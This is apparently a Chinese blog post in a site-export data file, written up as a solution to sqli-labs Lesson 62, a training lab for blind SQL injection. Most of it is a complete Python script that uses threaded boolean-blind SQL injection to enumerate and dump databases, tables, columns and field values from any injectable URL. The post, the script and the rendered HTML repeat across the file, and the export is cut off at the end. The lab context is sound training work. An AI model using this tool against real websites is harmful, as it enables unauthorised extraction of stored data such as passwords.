return chr(s)\n\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n解决的思路方向,优化脚本。\n\n1.其中一项是secret_XXXX 后四位由 大写字母和数字 组成,可以只猜解后这四位\n2.发现大小写字母和数字组成,可以缩小区域\n3.优化算法..脚本中有些请求是不必要的\n4.直接默认猜解challenges？\n\n暂时想到这么多...","source":"_posts/sqli-labs-lession-62-GET-盲注-变化1-仅允许130次请求.md","raw":"---\ntitle: sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求\ndate: 2018-11-29 14:05:15\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求\n\n---\n\n\n\n## 注入\n\n`http://10.60.17.35:8082/Less-62/?id=1')+and+1=1%23`\n\n`http://10.60.17.35:8082/Less-62/?id=1')+and+1=2%23`\n\n构造闭合方式为表现不同,表现为布尔型注入。\n\n可以使用脚本代替手工测试。\n\n获取当前数据库名\n\n![001](/img/sql/Lesson-62/001.png)\n\n获取表名\n\n![002](/img/sql/Lesson-62/002.png)\n\n获取列名\n\n![003](/img/sql/Lesson-62/003.png)\n\n获取秘钥\n\n![004](/img/sql/Lesson-62/004.png)\n\n成功。\n\n![005](/img/sql/Lesson-62/005.png)\n\n但是使用无论是脚本还是手注都会遇到一个问题,单个字符的猜解平均达到到8次请求,对脚本里用的取与法来说是正常的,但是在只能130次的情况下超出太多了,完整的一次流程达到630左右....\n\n## 测试脚本\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = \"')\"\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n解决的思路方向,优化脚本。\n\n1.其中一项是secret_XXXX 后四位由 大写字母和数字 组成,可以只猜解后这四位\n2.发现大小写字母和数字组成,可以缩小区域\n3.优化算法..脚本中有些请求是不必要的\n4.直接默认猜解challenges？\n\n暂时想到这么多...","slug":"sqli-labs-lession-62-GET-盲注-变化1-仅允许130次请求","published":1,"updated":"2019-06-19T17:23:13.398Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istkw009s4dsbfx377oj0","content":"<h1 id=\"sqli-labs-lession-62-GET-盲注-变化1-仅允许130次请求\"><a href=\"#sqli-labs-lession-62-GET-盲注-变化1-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求\"></a>sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p><code>http://10.60.17.35:8082/Less-62/?id=1&#39;)+and+1=1%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-62/?id=1&#39;)+and+1=2%23</code></p>\n<p>构造闭合方式为表现不同,表现为布尔型注入。</p>\n<p>可以使用脚本代替手工测试。</p>\n<p>获取当前数据库名</p>\n<p><img src=\"/img/sql/Lesson-62/001.png\" alt=\"001\"></p>\n<p>获取表名</p>\n<p><img src=\"/img/sql/Lesson-62/002.png\" alt=\"002\"></p>\n<p>获取列名</p>\n<p><img src=\"/img/sql/Lesson-62/003.png\" alt=\"003\"></p>\n<p>获取秘钥</p>\n<p><img src=\"/img/sql/Lesson-62/004.png\" alt=\"004\"></p>\n<p>成功。</p>\n<p><img src=\"/img/sql/Lesson-62/005.png\" alt=\"005\"></p>\n<p>但是使用无论是脚本还是手注都会遇到一个问题,单个字符的猜解平均达到到8次请求,对脚本里用的取与法来说是正常的,但是在只能130次的情况下超出太多了,完整的一次流程达到630左右….</p>\n<h2 id=\"测试脚本\"><a href=\"#测试脚本\" class=\"headerlink\" title=\"测试脚本\"></a>测试脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span 